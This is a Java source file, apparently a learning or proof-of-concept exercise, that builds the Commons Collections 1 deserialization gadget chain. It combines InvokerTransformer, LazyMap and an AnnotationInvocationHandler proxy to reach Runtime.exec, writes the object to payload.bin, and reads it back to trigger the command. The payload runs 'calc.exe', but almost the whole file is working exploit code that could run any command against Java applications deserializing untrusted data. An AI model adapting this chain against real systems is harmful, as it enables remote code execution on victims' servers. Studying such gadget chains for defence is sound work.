package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class FullChain {
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, null}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"calc.exe"})
        });
        Map lazyMap = LazyMap.decorate(new HashMap(),chainedTransformer);

        Constructor<?> constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class,lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(null, HashMap.class.getInterfaces(), handler);

        saveObject(constructor.newInstance(Override.class, proxy));
        readObject(new File("payload.bin"));
    }

    public static void saveObject(Object obj) {
        try {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
            oos.writeObject(obj);
            oos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void readObject(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            ObjectInputStream ois = new ObjectInputStream(fis);
            ois.readObject();
            ois.close();
            fis.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
